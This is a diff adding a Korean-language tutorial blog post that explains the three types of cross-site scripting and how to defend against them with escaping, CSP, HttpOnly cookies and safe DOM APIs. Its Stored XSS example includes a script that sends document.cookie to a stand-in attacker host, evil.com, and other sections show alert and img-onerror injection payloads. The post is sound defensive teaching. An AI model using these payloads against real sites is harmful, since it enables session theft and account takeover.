@@ -1,0 +1,186 @@
+---
+title: "XSS: 크로스 사이트 스크립팅"
+description: "가장 흔한 웹 공격인 XSS — Stored, Reflected, DOM-based 세 가지 유형과 방어법을 시각화합니다"
+date: 2026-04-02
+tags: ["browser", "security", "xss", "injection"]
+series: "web-security"
+seriesOrder: 2
+draft: false
+---
+
+## XSS란
+
+Cross-Site Scripting(XSS)은 공격자가 다른 사용자의 브라우저에서 악성 스크립트를 실행시키는 공격입니다. 이름에 "Cross-Site"가 들어가지만, 실제로는 같은 출처 안에서 동작합니다. 공격자가 신뢰할 수 있는 사이트에 스크립트를 주입하면, 브라우저는 그 스크립트가 해당 사이트의 정상적인 코드인지 주입된 코드인지 구별할 수 없습니다.
+
+[이전 글](/posts/web-security-basics)에서 살펴본 Same-Origin Policy는 다른 출처 간의 접근을 차단합니다. 하지만 XSS는 SOP를 우회하는 것이 아니라, 아예 같은 출처 안에서 실행됩니다. 공격자의 코드가 `bank.com`의 페이지에 삽입되면, 브라우저 입장에서 그 코드의 출처는 `bank.com`입니다. 따라서 `bank.com`의 쿠키, DOM, localStorage에 자유롭게 접근할 수 있습니다.
+
+XSS가 가능하면 공격자는 다음과 같은 일을 할 수 있습니다.
+
+- 세션 쿠키를 탈취하여 사용자로 위장
+- 키 입력을 기록하여 비밀번호 수집
+- 페이지 내용을 변조하여 피싱
+- 사용자 권한으로 API 요청 전송
+
+OWASP Top 10에서 수년간 상위를 차지해온 가장 흔한 웹 공격입니다.
+
+## 세 가지 XSS 유형
+
+XSS는 스크립트가 주입되는 경로에 따라 세 가지로 분류됩니다. 각 유형의 공격 흐름을 단계별로 확인해 보세요.
+
+<XssAttackFlow />
+
+세 유형의 핵심 차이는 악성 스크립트가 어디에 존재하느냐입니다. Stored는 서버 DB에, Reflected는 URL 파라미터에, DOM-based는 클라이언트 JavaScript의 처리 과정에 있습니다.
+
+## Stored XSS
+
+Stored XSS(저장형 XSS)는 가장 위험한 유형입니다. 공격자가 입력한 악성 스크립트가 서버의 데이터베이스에 저장되고, 해당 페이지를 방문하는 모든 사용자에게 영향을 미칩니다.
+
+대표적인 발생 지점은 게시판 댓글, 사용자 프로필, 상품 리뷰 등 사용자가 입력한 내용을 다른 사용자에게 보여주는 곳입니다.
+
+```html
+<!-- 서버가 DB에서 가져온 댓글을 그대로 HTML에 삽입 -->
+<div class="comment">
+  좋은 글이네요!
+  <script>
+    fetch("https://evil.com/steal?cookie=" + document.cookie);
+  </script>
+</div>
+```
+
+브라우저는 이 HTML을 파싱하면서 `<script>` 태그를 만나면 당연히 실행합니다. 서버가 응답한 정상적인 HTML의 일부로 보이기 때문입니다. 한번 저장되면 공격자가 추가 행동을 하지 않아도 방문자마다 자동으로 실행됩니다.
+
+## Reflected XSS
+
+Reflected XSS(반사형 XSS)는 URL의 파라미터에 포함된 악성 스크립트가 서버 응답에 그대로 반영되어 실행되는 유형입니다. Stored와 달리 DB에 저장되지 않으므로 일회성입니다.
+
+```text
+https://shop.com/search?q=<script>alert(document.cookie)</script>
+```
+
+서버가 검색어를 이스케이프 없이 HTML에 포함하면 문제가 됩니다.
+
+```html
+<!-- 서버 응답 -->
+<p>"<script>alert(document.cookie)</script>"에 대한 검색 결과가 없습니다.</p>
+```
+
+Reflected XSS는 단독으로는 위험하지 않습니다. 피해자가 악성 URL을 직접 클릭해야 하기 때문입니다. 그래서 공격자는 피싱 이메일이나 메시지와 결합합니다. URL을 단축 서비스로 감추거나 인코딩하여 악성 코드가 눈에 띄지 않게 만듭니다.
+
+## DOM-based XSS
+
+DOM-based XSS는 서버를 전혀 거치지 않는 유형입니다. 클라이언트 JavaScript가 URL의 fragment, 쿼리 파라미터, 또는 기타 사용자 제어 가능한 입력을 읽어서 DOM에 삽입할 때 발생합니다.
+
+```javascript
+// 취약한 코드: URL fragment를 DOM에 삽입
+const hash = location.hash.substring(1);
+document.getElementById("content").innerHTML = hash;
+```
+
+URL이 `https://app.com/#<img onerror=alert(1) src=x>`라면, `innerHTML`에 의해 `<img>` 태그가 삽입되고 `onerror` 핸들러가 실행됩니다.
+
+이 유형의 특징은 서버 로그에 흔적이 남지 않는다는 것입니다. URL의 fragment(`#` 이후 부분)는 브라우저가 서버로 전송하지 않습니다. 서버 측 WAF(웹 애플리케이션 방화벽)나 로그 분석으로는 탐지할 수 없습니다.
+
+## XSS 방어
+
+XSS 방어의 핵심 원칙은 간단합니다. 사용자 입력을 신뢰하지 말고, 출력할 때 반드시 이스케이프하라는 것입니다.
+
+**출력 인코딩(HTML Entity Encoding)** -- 사용자 입력을 HTML에 삽입할 때, 특수 문자를 HTML 엔티티로 변환합니다.
+
+```javascript
+function escapeHtml(str) {
+  return str
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#39;");
+}
+
+// <script>alert(1)</script>
+// → &lt;script&gt;alert(1)&lt;/script&gt;
+// 브라우저가 텍스트로 표시할 뿐 실행하지 않음
+```
+
+**Content Security Policy (CSP)** -- HTTP 헤더로 실행 가능한 스크립트의 출처를 제한합니다.
+
+```text
+Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.trusted.com
+```
+
+이 설정은 인라인 스크립트의 실행을 차단합니다. XSS로 `<script>alert(1)</script>`가 주입되더라도 CSP가 실행을 막습니다. 물론 CSP만으로 모든 XSS를 막을 수 있는 것은 아닙니다. CSP는 최후의 방어선이지, 출력 인코딩을 대체하는 것은 아닙니다.
+
+**HttpOnly 쿠키** -- 세션 쿠키에 `HttpOnly` 플래그를 설정하면 JavaScript에서 `document.cookie`로 접근할 수 없습니다.
+
+```text
+Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
+```
+
+XSS가 발생하더라도 쿠키 탈취는 막을 수 있습니다. 하지만 공격자가 사용자 권한으로 API를 직접 호출하는 것까지 막지는 못합니다.
+
+**프레임워크의 자동 이스케이프** -- React, Vue, Angular 같은 현대 프레임워크는 기본적으로 출력을 이스케이프합니다.
+
+```jsx
+// React — 안전: 자동으로 이스케이프됨
+function Comment({ text }) {
+  return <p>{text}</p>;
+}
+// text에 "<script>alert(1)</script>"가 들어와도 텍스트로 렌더링됨
+```
+
+React의 JSX에서 `{변수}`로 값을 삽입하면 자동으로 HTML 이스케이프가 적용됩니다. 하지만 이 보호를 우회하는 방법이 있습니다. 바로 `dangerouslySetInnerHTML`입니다.
+
+```jsx
+// React — 위험: 이스케이프 우회
+function Comment({ html }) {
+  return <div dangerouslySetInnerHTML={{ __html: html }} />;
+}
+// html에 악성 스크립트가 포함되면 그대로 실행됨
+```
+
+이름에 "dangerously"가 들어간 이유가 있습니다. 사용자 입력을 이 API에 넘기지 마세요.
+
+## 위험한 API들
+
+JavaScript에는 문자열을 HTML이나 코드로 해석하는 API들이 있습니다. 사용자 입력이 이 API들에 전달되면 XSS가 발생합니다.
+
+| 위험한 API | 안전한 대안 |
+|-----------|-----------|
+| `element.innerHTML = value` | `element.textContent = value` |
+| `element.outerHTML = value` | DOM API로 요소 생성 |
+| `document.write(value)` | DOM API 사용 |
+| `eval(value)` | `JSON.parse()` 등 목적에 맞는 파서 |
+| `setTimeout(string)` | `setTimeout(function)` |
+| `new Function(string)` | 일반 함수 정의 |
+
+`innerHTML`과 `textContent`의 차이를 이해하는 것이 중요합니다.
+
+```javascript
+const userInput = '<img onerror=alert(1) src=x>';
+
+// 위험: HTML로 해석되어 onerror 실행
+element.innerHTML = userInput;
+
+// 안전: 텍스트로 표시됨
+element.textContent = userInput;
+// 화면에 "<img onerror=alert(1) src=x>" 문자열이 그대로 보임
+```
+
+`textContent`는 문자열을 있는 그대로 텍스트 노드로 삽입합니다. HTML 태그로 해석되지 않으므로 XSS가 발생하지 않습니다. DOM에 HTML 구조를 삽입해야 하는 경우에는 DOMParser나 템플릿 리터럴 대신, 프레임워크의 컴포넌트 시스템을 사용하는 것이 안전합니다.
+
+`eval()`은 문자열을 JavaScript 코드로 실행합니다. 사용자 입력이 `eval()`에 도달하면 임의의 코드가 실행될 수 있습니다. `setTimeout`과 `setInterval`에 문자열을 넘기는 것도 내부적으로 `eval()`과 동일합니다. 항상 함수를 넘기세요.
+
+```javascript
+// 위험
+setTimeout("alert(userInput)", 1000);
+
+// 안전
+setTimeout(() => {
+  console.log(userInput);
+}, 1000);
+```
+
+## 다음 단계
+
+XSS는 공격자의 코드가 사용자의 브라우저에서 실행되는 공격입니다. 방어의 핵심은 출력 인코딩, CSP, HttpOnly 쿠키, 그리고 위험한 API를 피하는 것입니다. 현대 프레임워크가 기본 보호를 제공하지만, `dangerouslySetInnerHTML`이나 `innerHTML`을 사용하는 순간 그 보호가 무력화됩니다.
+
+다음 글에서는 **CSRF(Cross-Site Request Forgery)**를 다룹니다. XSS가 사용자의 브라우저에서 코드를 실행하는 공격이라면, CSRF는 사용자의 인증된 세션을 악용하여 의도하지 않은 요청을 보내게 만드는 공격입니다. 폼 제출이 교차 출처에서 허용되고 쿠키가 자동으로 전송되는 브라우저의 특성이 어떻게 악용되는지 살펴봅니다.
